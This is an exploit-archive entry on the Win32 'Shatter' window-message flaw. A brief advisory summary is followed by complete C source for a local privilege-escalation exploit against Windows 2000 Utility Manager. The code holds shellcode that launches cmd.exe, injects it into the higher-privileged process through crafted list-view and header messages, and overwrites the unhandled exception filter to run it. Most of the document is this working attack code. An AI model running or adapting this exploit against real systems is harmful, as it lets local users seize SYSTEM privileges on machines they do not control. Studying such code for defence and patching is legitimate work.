source: http://www.securityfocus.com/bid/5408/info

A serious design error in the Win32 API has been reported. The issue is related to the inter-window message passing system. This vulnerability is wide-ranging and likely affects almost every Win32 window-based application. Attackers with local access may exploit this vulnerability to elevate privileges if a window belonging to another process with higher privileges is present. One example of such a process is antivirus software, which often must run with LocalSystem privileges.

** Microsoft has released a statement regarding this issue. Please see the References section for details.

A paper, entitled "Win32 Message Vulnerabilities Redux" has been published by iDEFENSE that describes another Windows message that may be abused in a similar manner to WM_TIMER. Microsoft has not released patches to address problems with this message. There are likely other messages which can be exploited in the same manner.

Another proof-of-concept has been released by Brett Moore in a paper entitled "Shattering SEH III". This paper demonstrates how Shatter attacks may be used against applications which make use of progress bar controls.

Brett Moore has released a paper entitled "Shattering By Example" which summarizes previous Shatter attacks, discusses new techniques and also provides an exploit which abuses Windows statusbars using WM_SETTEXT, SB_SETTEXT, SB_GETTEXTLENGTH, SB_SETPARTS and SB_GETPARTS messages. Please see the attached reference to the paper for more details.

//---------------------------UtlExp.c------------------------------
/******************************************************************
*sectroyer
*Random Intruders
*
*The exploit uses two shatter vulnerabilities to cause
*the execution of code. The first option isn't universal
*but two others should work with any Win2k with any 
*language(of course on condition, that you will set
*the correct main window title).
*
*sectroyer@go2.pl
*
*******************************************************************/
#include <stdio.h>
#include <windows.h>
#include <commctrl.h>
#define NOP 0x90
#define UEF long(__stdcall*)(_EXCEPTION_POINTERS*)
// Local Cmd Shellcode
unsigned char exec[]=
"\x55" // push ebp
"\x8b\xec" // mov ebp, esp
"\x33\xc0" // xor esi, esi
"\x50" // push esi
"\x68.exe" // push 'exe.'
"\x68 cmd" // push 'cmd '
"\x40" // inc esi
"\x50" // push esi
"\x8d\x45\xF5" // lea edi, [ebp-0xf]
"\x50" // push edi
"\xb8XXXX" // mov eax, XXXX -> 
WinExec()
"\xff\xd0" // call eax
"\x33\xf6" // xor esi,esi
"\x4e" // dec esi
"\x50" // push esi
"\xb8YYYY" // mov eax, YYYY -> 
ExitProcess()
"\xff\xd0" // call eax
"\x5d" // pop ebp
"\x5d" // pop ebp
"\x5d" // pop ebp
"\x5d" // pop ebp
"\xC3"; // ret
unsigned char buf[2048];
long hLVControl,hHdrControl,t=0;
char *tWindow;
char tWindowEn[]="Utility Manager";// The name of the main window
char tWindowPl[]="Mened?er narz?dzi";// The name of the main window
long sehHandler = 0x12345678; // Critical Address To Overwrite
long shellcodeaddr = 0x7FFDE060; // Known Writeable Space Or 
Global Space
long FindUnhandledExceptionFilter();
void doWrite(long tByte,long address);
void IterateWindows(long hWnd);
int main(int argc, char *argv[])
{
long hWnd;
HMODULE hMod;
DWORD ProcAddr;
printf("Utility Manager Exploit written by sectroyer 
<sectroyer@go2.pl>\n");
printf("Usage: %s <language> <option>\n", argv[0]);
printf("Languages:\n<0> Engilish\n<1> Polish\n");
printf("Options:\n");
printf("<0> LVM_SORTITEMS Vulnerability\n");
printf("<1> HDM_GETITEMRECT using UnhandledExcpetionFilter\n");
printf("<2> HDM_GETITEMRECT using LVM_SORTITEMS 
Vulnerability\n");
if(argc!=3)
return 0;
if(atoi(argv[2])<0||atoi(argv[2])>2)
return 0;
if(atoi(argv[1])<0||atoi(argv[1])>1)
return 0;
if(!atoi(argv[1]))
tWindow=tWindowEn;
else
tWindow=tWindowPl;
// Find local procedure address
t=atoi(argv[2]);
PROCESS_INFORMATION pi;
STARTUPINFO si={sizeof(STARTUPINFO)};
CreateProcessA
(NULL,"utilman.exe /start",NULL,NULL,NULL,NULL,NULL,NULL,&si,&pi);
Sleep(1000);
hMod = LoadLibrary("kernel32.dll");
*(long*)&exec[(int)(strstr((char*)exec,"XXXX")-exec)]=(long)
GetProcAddress(hMod,"WinExec");
*(long*)&exec[(int)(strstr((char*)exec,"YYYY")-exec)]=(long)
GetProcAddress(hMod,"ExitProcess");
printf("[+] Finding %s Window...\n",tWindow);
hWnd = (long)FindWindow(NULL,tWindow);
if(hWnd == NULL)
{
printf("[-] Couldn't Find %s Window\n",tWindow);
return 0;
}
printf("[+] Found Main Window At...0x%xh\n",hWnd);
IterateWindows(hWnd);
printf("[-] Not Done...\n");
return 0;
}
void doWrite(long tByte,long address)
{
SendMessage((HWND) hLVControl,(UINT) LVM_SETCOLUMNWIDTH,
0,MAKELPARAM(tByte, 0));
SendMessage((HWND) hHdrControl,(UINT) HDM_GETITEMRECT,1,address);
}
long FindUnhandledExceptionFilter()
{
long *pos;
void *hLib;
hLib=LoadLibraryA("kernel32.dll");
pos = (long*)hLib;
SetUnhandledExceptionFilter((UEF)0xA1A2A3A4);
__try
{
while(1)
{
if(*pos==0xA1A2A3A4)
{
SetUnhandledExceptionFilter((UEF)0xB4B3B2B1);
if(*pos==0xB4B3B2B1)
{
SetUnhandledExceptionFilter((UEF)0xFADEFADE);
if(*pos==0xFADEFADE)
break;
}
}
pos++;
}
}
__except(1)
{
return NULL;
}
return (long)pos;
}
void IterateWindows(long hWnd)
{
long childhWnd,looper;
childhWnd = (long)GetNextWindow((void*)hWnd,GW_CHILD);
while (childhWnd != NULL)
{
IterateWindows(childhWnd);
childhWnd = (long)GetNextWindow((void*)
childhWnd ,GW_HWNDNEXT);
}
hLVControl = hWnd;
hHdrControl = SendMessage((HWND) hLVControl,(UINT) 
LVM_GETHEADER, 0,0);
if(hHdrControl != NULL)
{
// Found a Listview Window with a Header
printf("[+] Found listview window..0x%xh\n",hLVControl);
if(t!=0)
{
printf("[+] Found lvheader window..0x%xh\n",hHdrControl);
// Inject shellcode to known address
printf("[+] Sending shellcode to...0x%xh\n",shellcodeaddr);
for (looper=0;looper<sizeof(exec);looper++)
doWrite((long) exec[looper],(shellcodeaddr + looper));
// Overwrite SEH
printf("[+] Finding UnhandledExceptionFilter....\n");
sehHandler=FindUnhandledExceptionFilter();
printf("[+] Overwriting Top SEH....0x%xh\n",sehHandler);
doWrite(((shellcodeaddr) & 0xff),sehHandler);
doWrite(((shellcodeaddr >> 8) & 0xff),sehHandler+1);
doWrite(((shellcodeaddr >> 16) & 0xff),sehHandler+2);
doWrite(((shellcodeaddr >> 24) & 0xff),sehHandler+3);
}
if(t==0)
{
printf("[+] LVM_SORTITEMS Vulnerability\n");
COPYDATASTRUCT cds;
memset(buf,NOP,sizeof(buf));
memcpy(buf+700,exec,sizeof(exec)-1);
cds.cbData=1000;
cds.dwData=0;
cds.lpData=buf;
SendMessage((void*)hWnd, WM_COPYDATA, (WPARAM)hWnd, 
(LPARAM)&cds);
SendMessage( (PVOID)hLVControl, LVM_SORTITEMS, 1, 
0x007efd04);
printf("[+] Done...\n");
}
else if(t==1)
{
printf("[+] HDM_GETITEMRECT Using 
UnhandledExceptionFilter\n");
SendMessage((HWND) hHdrControl,(UINT) HDM_GETITEMRECT,0,1);
printf("[+] Done...\n");
}
else if(t==2)
{
printf("[+] HDM_GETITEMRECT Using LVM_SORTITEMS 
Vulnerability\n");
SendMessage((HWND) hLVControl,(UINT) 
LVM_SORTITEMS,1,shellcodeaddr);
printf("[+] Done...\n");
}
exit(0);
}
}